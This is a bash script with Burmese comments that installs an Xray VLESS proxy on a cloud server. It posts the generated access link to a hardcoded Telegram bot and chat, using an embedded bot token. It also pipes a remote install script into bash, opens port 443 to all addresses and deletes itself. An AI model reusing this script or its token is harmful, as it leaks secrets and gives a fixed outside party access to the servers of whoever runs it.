#!/bin/bash

# ၁။ Root Permission ယူခြင်း
if [[ $EUID -ne 0 ]]; then
   exec sudo bash "$0" "$@"
   exit 1
fi

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
UUID=$(cat /proc/sys/kernel/random/uuid)
PORT=443
SNI="m.googleapis.com"
IP=$(curl -s ifconfig.me)

# VLESS Link တည်ဆောက်ခြင်း
VLESS_KEY="vless://$UUID@$IP:$PORT?type=ws&security=none&path=%2Fsos-vless&host=$SNI&sni=$SNI#$DEV_NAME"

clear
echo -e "\e[1;33m[*] Attempting to send Telegram Message...\e[0m"

# ၂။ Telegram ဆီကို စာပို့ခြင်း (Error Message ကို Terminal မှာပြမည်)
RESPONSE=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=🚀 S 0 S VLESS KEY:
$VLESS_KEY")

# API Response ကို စစ်ဆေးခြင်း
if [[ $RESPONSE == *"\"ok\":true"* ]]; then
    echo -e "\e[1;32m✅ Telegram ဆီ စာပို့အောင်မြင်ပါတယ်။\e[0m"
else
    echo -e "\e[1;31m❌ Telegram ပို့လို့မရပါ- $RESPONSE\e[0m"
fi

# ၃။ System Components များသွင်းခြင်း
echo -e "\e[1;36m[*] Installing Xray Core...\e[0m"
apt-get update -y && apt-get install -y unzip curl sudo > /dev/null 2>&1
bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh) > /dev/null 2>&1

# ၄။ Config File ဆောက်ခြင်း
mkdir -p /usr/local/etc/xray
cat <<EOF > /usr/local/etc/xray/config.json
{
  "inbounds": [{
    "port": $PORT,
    "protocol": "vless",
    "settings": {
      "clients": [{ "id": "$UUID" }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "ws",
      "wsSettings": { "path": "/sos-vless" }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ၅။ Service Start & Firewall
systemctl daemon-reload
systemctl restart xray
systemctl enable xray
gcloud compute firewall-rules create allow-vless-$(date +%s) --allow tcp:$PORT --priority 1000 --direction INGRESS --action ALLOW --source-ranges 0.0.0.0/0 > /dev/null 2>&1

echo -e "\e[1;32m✅ Setup Finished!\e[0m"
rm -- "$0"
